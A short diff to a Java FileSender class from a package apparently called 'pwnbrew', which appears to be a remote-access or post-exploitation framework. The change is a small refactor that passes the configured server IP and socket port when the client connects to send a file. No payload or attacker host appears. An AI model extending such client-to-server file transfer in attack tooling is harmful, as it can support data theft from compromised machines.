@@ -54,7 +54,6 @@ import java.util.Arrays;
 import java.util.logging.Level;
 import pwnbrew.ClientConfig;
 import pwnbrew.concurrent.LockListener;
-import pwnbrew.log.LoggableException;
 import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.CommManager;
 import pwnbrew.misc.Constants;
@@ -101,22 +100,23 @@ public class FileSender extends ManagedRunnable implements LockListener {
     @Override
     protected void go() {
         
-         //Get the socket router
-        int thePort = ClientConfig.getConfig().getSocketPort();
-        ClientPortRouter aPR = (ClientPortRouter) theCommManager.getPortRouter( thePort );
+        //Get the socket router
+        ClientConfig theConf = ClientConfig.getConfig();
+        int socketPort = theConf.getSocketPort();
+        String serverIp = theConf.getServerIp();
+        ClientPortRouter aPR = (ClientPortRouter) theCommManager.getPortRouter( socketPort );
 
         //Initiate the file transfer
         if(aPR != null){
 
             int fileId = theFileAck.getFileId();
-            aPR.ensureConnectivity( thePort, this );       
+            aPR.ensureConnectivity( serverIp, socketPort, this );       
             try {
 
                 File fileToSend = new File( theFileAck.getFilename());
                 if( !fileToSend.exists()){
                     
                     File libDir = FileUtilities.getTempDir();
-//                    File libDir = new File( Persistence.getDataPath(), Integer.toString( theFileAck.getTaskId()) );
                     fileToSend = new File(libDir, theFileAck.getFilename());
                 }
 
